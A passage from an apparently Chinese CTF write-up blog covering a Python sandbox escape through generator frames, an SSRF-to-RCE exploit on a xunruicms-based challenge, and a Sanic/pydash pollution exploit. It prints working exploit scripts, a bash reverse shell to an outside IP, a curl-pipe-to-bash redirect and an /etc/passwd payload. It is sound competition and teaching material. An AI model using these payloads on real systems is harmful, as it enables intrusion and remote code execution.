class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&quot;flag&#123;test&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">codes = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">import pdb</span></span><br><span class="line"><span class="string">def f():</span></span><br><span class="line"><span class="string">    yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">g = f()</span></span><br><span class="line"><span class="string">print(g)# generator</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">frame = next(g)</span></span><br><span class="line"><span class="string"># pdb.set_trace()</span></span><br><span class="line"><span class="string">print(frame)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(frame.f_back)# jail!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(frame.f_back.f_back)# None</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(frame.f_back.f_globals[&#x27;key&#x27;])</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">locals</span> = &#123;&#125;</span><br><span class="line">code = <span class="built_in">compile</span>(codes,<span class="string">&quot;test2&quot;</span>,<span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code, <span class="built_in">locals</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">locals</span>)</span><br></pre></td></tr></table></figure><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405312055750.png" alt="image-20240531205506279"></p><ul><li>demo2</li></ul><p>调用栈如下：</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405312155907.png" alt="image-20240531210144713"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exp.py: <span class="built_in">compile</span>&lt;= frame.f_back.f_back</span><br><span class="line">--&gt; test: &lt;module&gt; &lt;= frame.f_back</span><br><span class="line">        --&gt; test: waff()&lt;= (frame=g.gi_frame.f_back)</span><br><span class="line">            --&gt; test: f()----------↑</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def waff():</span></span><br><span class="line"><span class="string">    def f():</span></span><br><span class="line"><span class="string">        yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    g = f()  #生成器</span></span><br><span class="line"><span class="string">    frame = next(g) #获取到生成器的栈帧对象</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    print(frame)</span></span><br><span class="line"><span class="string">    print(frame.f_back)</span></span><br><span class="line"><span class="string">    print(frame.f_back.f_back)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] #返回并获取前一级栈帧的globals</span></span><br><span class="line"><span class="string">    return b</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">b=waff()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">locals</span>=&#123;&#125;</span><br><span class="line">code = <span class="built_in">compile</span>(codes, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code,<span class="built_in">locals</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">locals</span>[<span class="string">&quot;b&quot;</span>])</span><br></pre></td></tr></table></figure><ul><li>demo3</li></ul><p>​这样子不行，因为没有把构造的栈帧挂钩到调用栈中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def f2():</span></span><br><span class="line"><span class="string">    yield 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">g = f2()</span></span><br><span class="line"><span class="string">next(g)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(g.gi_frame)               # &lt;frame at 0x000001C35FEE18C0, file &#x27;test&#x27;, line 6, code f2&gt;</span></span><br><span class="line"><span class="string">print(g.gi_frame.f_back)        # None</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">locals</span> = &#123;&#125;</span><br><span class="line">code = <span class="built_in">compile</span>(codes, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code, <span class="built_in">locals</span>)</span><br></pre></td></tr></table></figure><h4 id="builtins-字段"><a href="#builtins-字段" class="headerlink" title="__builtins__字段"></a><code>__builtins__</code>字段</h4><p><code>__builtins__</code> 模块是 <strong>Python 解释器启动时自动加载的</strong>，其中包含了一系列内置函数、异常和其他内置对象。</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>过滤得挺天花乱坠的，过滤流程：</p><ul><li>源码上进行正则匹配，上黑名单</li><li></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">source_simple_check</span>(<span class="params">source</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source with pure string in string, prevent dangerous strings</span></span><br><span class="line"><span class="string">    :param source: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        source.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;non-ascii is not permitted&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 不能有__ getattr exit</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;__&quot;</span>, <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;exit&quot;</span>]:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> source.lower():</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_wrapper</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the run process with sys.audithook, no dangerous operations should be conduct</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">audit</span>(<span class="params">event, args</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span>, <span class="built_in">print</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;event:<span class="subst">&#123;event&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;args:<span class="subst">&#123;args&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;marshal&quot;</span>, <span class="string">&quot;__new__&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;interpreter&quot;</span>, <span class="string">&quot;cpython&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;compile&quot;</span>, <span class="string">&quot;gc&quot;</span>]:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> (event + <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> args)).lower():</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">                os._exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> audit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source_opcode_checker</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source in the bytecode aspect, no methods and globals should be load</span></span><br><span class="line"><span class="string">    :param code: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> dis <span class="keyword">import</span> dis</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span></span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"></span><br><span class="line">    opcodeIO = StringIO()       <span class="comment"># 创建内存对象</span></span><br><span class="line">    dis(code, file=opcodeIO)    <span class="comment"># code反汇编写入到opcodeIO对象中</span></span><br><span class="line">    opcode = opcodeIO.getvalue().split(<span class="string">&quot;\n&quot;</span>)    <span class="comment">#</span></span><br><span class="line">    opcodeIO.close()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> opcode:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>]):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;randint&quot;</span>, <span class="string">&quot;randrange&quot;</span>, <span class="string">&quot;print&quot;</span>, <span class="string">&quot;seed&quot;</span>]):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([x <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>] <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>(line)]))</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">open</span></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> addaudithook</span><br><span class="line">    <span class="keyword">from</span> contextlib <span class="keyword">import</span> redirect_stdout</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> randint, randrange, seed</span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> seed</span><br><span class="line">    <span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># source = open(f&quot;/app/uploads/THIS_IS_TASK_RANDOM_ID.txt&quot;, &quot;r&quot;).read()           # 读取代码文件</span></span><br><span class="line">    <span class="comment"># source = &#x27;_posixsubprocess.fork_exec([b&quot;/bin/cat&quot;,&quot;/etc/passwd&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># source = &quot;@exec\n@input\nclass X:\n\tpass&quot;</span></span><br><span class="line"></span><br><span class="line">    source_simple_check(source)</span><br><span class="line">    source_opcode_checker(source)</span><br><span class="line">    code = <span class="built_in">compile</span>(source, <span class="string">&quot;&lt;sandbox&gt;&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line">    addaudithook(block_wrapper())</span><br><span class="line">    outputIO = StringIO()</span><br><span class="line">    <span class="keyword">with</span> redirect_stdout(outputIO):         <span class="comment"># 将执行结果重定向到outputIO对象中</span></span><br><span class="line">        seed(<span class="built_in">str</span>(time()) + <span class="string">&quot;THIS_IS_SEED&quot;</span> + <span class="built_in">str</span>(time()))</span><br><span class="line">        <span class="built_in">exec</span>(code, &#123;</span><br><span class="line">            <span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;randint&quot;</span>: randint,</span><br><span class="line">            <span class="string">&quot;randrange&quot;</span>: randrange,</span><br><span class="line">            <span class="string">&quot;seed&quot;</span>: seed,</span><br><span class="line">            <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span></span><br><span class="line">        &#125;, <span class="literal">None</span>)</span><br><span class="line">    output = outputIO.getvalue()           <span class="comment"># 获取执行结果</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;THIS_IS_SEED&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bad code-operation why still happened ah?&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(output)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>exp：</p><p>表示常量：<code>co_consts</code></p><p>表示符号：<code>co_names</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;https://d0f3ee51-5c32-43ba-8514-040bde99f2a9.challenge.ctf.show/run&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def exp():</span></span><br><span class="line"><span class="string">    def scq():</span></span><br><span class="line"><span class="string">        yield scq.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    scq = scq()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    frame = [x for x in scq][0]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    gattr = frame.f_back.f_back.f_back.f_locals[&#x27;_&#x27;+&#x27;_builtins_&#x27;+&#x27;_&#x27;]# jail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    s = gattr.str</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    for i in s(frame.f_back.f_back.f_back.f_code.co_consts):# 读常量</span></span><br><span class="line"><span class="string">        print(i, end = &quot;,&quot;)</span></span><br><span class="line"><span class="string">exp()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, json=data)</span><br><span class="line"><span class="built_in">print</span>(response.json())</span><br></pre></td></tr></table></figure><h2 id="easycms-revenge-easycms"><a href="#easycms-revenge-easycms" class="headerlink" title="easycms_revenge &#x2F; easycms"></a>easycms_revenge &#x2F; easycms</h2><p>做法：参考xunruicms RCE的文章，发现可以进行任意函数调用，找qrcode，打一个SSRF302跳转到flag.php，反弹shell即可</p><p>hint中提示了flag.php文件，需要本地发起请求，然后<code>system($_GET[&#39;cmd&#39;])</code></p><p>需要找一个SSRF的点，且读Readme.txt中，后台地址带随机字符串，应该就直接打前台</p><p>思路参考：</p><ul><li><p><a href="https://xz.aliyun.com/t/10002?time__1311=mq+xBD97qYqCqAKDsD7me5xrB2cDGKx&alichlgref=https://www.google.com.hk/">https://xz.aliyun.com/t/10002?time__1311=mq%2BxBD97qYqCqAKDsD7me5xrB2cDGKx&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F</a></p></li><li><p><a href="https://m.xunruicms.com/bug/">https://m.xunruicms.com/bug/</a></p></li></ul><p>进行任意controller调用，且得找一个不需要鉴权的点，<code>dayrui/Fcms/Control/Api/Api.php</code>中的<code>qrcode</code>中通过<code>url</code>获取图片</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406081358135.png" alt="image-20240519180553013"></p><p>打一个302跳转和GIF89a图片头欺骗即可访问本地路由，然后反弹shell</p><p>exp：</p><p><code>bash.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.144.238.242/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>在9998端口上开web服务，index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1/flag.php?cmd=curl%20192.144.238.242:9998/bash.html|bash&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;GIF89a&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">GIF89a</span><br></pre></td></tr></table></figure><p>9999端口nc监听</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2ze2oi5b528th9b5tbso.cloudeci1.ichunqiu.com/&quot;</span></span><br><span class="line"></span><br><span class="line">vps_ip = <span class="string">&quot;192.144.238.242&quot;</span></span><br><span class="line"></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;s&quot;</span>:<span class="string">&quot;api&quot;</span>,</span><br><span class="line">    <span class="string">&quot;c&quot;</span>:<span class="string">&quot;api&quot;</span>,</span><br><span class="line">    <span class="string">&quot;m&quot;</span>:<span class="string">&quot;qrcode&quot;</span>,</span><br><span class="line">    <span class="string">&quot;text&quot;</span>: <span class="string">&quot;1111&quot;</span>,</span><br><span class="line">    <span class="string">&quot;size&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">    <span class="string">&quot;level&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;thumb&quot;</span>: <span class="string">&quot;http://192.144.238.242:9998&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">resp = s.get(url=url, params=data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>反弹shell</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406081358105.png" alt="image-20240519182344115"></p><h2 id="sanic"><a href="#sanic" class="headerlink" title="sanic"></a>sanic</h2><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><ul><li>8进制编码绕过</li></ul><p>一些编码的本地测试</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406081359852.png" alt="image-20240607173711067"></p><h3 id="pydash原型链污染"><a href="#pydash原型链污染" class="headerlink" title="pydash原型链污染"></a>pydash原型链污染</h3><p>参考我的另一篇博客：<a href="https://ch31sbest.github.io/2024/06/08/WebExploit/Sanic-Pydash-Pollution/">https://ch31sbest.github.io/2024/06/08/WebExploit/Sanic-Pydash-Pollution/</a></p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://203ca7f0-a069-4bff-b9bd-fc54ab33db47.challenge.ctf.show&quot;</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&quot;user&quot;</span>: <span class="string">&#x27;&quot;adm\\073n&quot;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = s.get(url + <span class="string">&quot;/login&quot;</span>, cookies=cookie)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改directory_view属性</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="comment"># app.router.name_index[&#x27;__mp_main__.static&#x27;].handler.keywords[&#x27;directory_handler&#x27;].directory_view</span></span><br><span class="line">    <span class="string">&quot;key&quot;</span>: <span class="string">&quot;__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="literal">True</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp1 = s.get(url + <span class="string">&quot;/admin&quot;</span>, json=data1)</span><br><span class="line"><span class="built_in">print</span>(resp1.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="comment"># app.router.name_index[&#x27;__mp_main__.static&#x27;].handler.keywords[&#x27;directory_handler&#x27;].directory_view</span></span><br><span class="line">    <span class="string">&quot;key&quot;</span>: <span class="string">&quot;__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: [<span class="string">&quot;/&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp2 = s.get(url + <span class="string">&#x27;/admin&#x27;</span>, json=data2)</span><br><span class="line"><span class="built_in">print</span>(resp2.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># resp3 = s.get(url + &#x27;/static/&#x27;)</span></span><br><span class="line"><span class="comment"># print(resp3.text)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 24bcbd0192e591d6ded1_flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">readflag = &#123;</span><br><span class="line">    <span class="string">&quot;key&quot;</span>: <span class="string">&quot;__init__\\\\.__globals__\\\\.__file__&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;/24bcbd0192e591d6ded1_flag&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp3 = s.get(url+<span class="string">&#x27;/admin&#x27;</span>, json=readflag)</span><br><span class="line"></span><br><span class="line">resp4 = s.get(url+<span class="string">&#x27;/src&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp4.text)</span><br><span class="line"></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><ul><li>Springboot</li></ul><p>给了个jar包，打开是个SpringBoot项目</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td 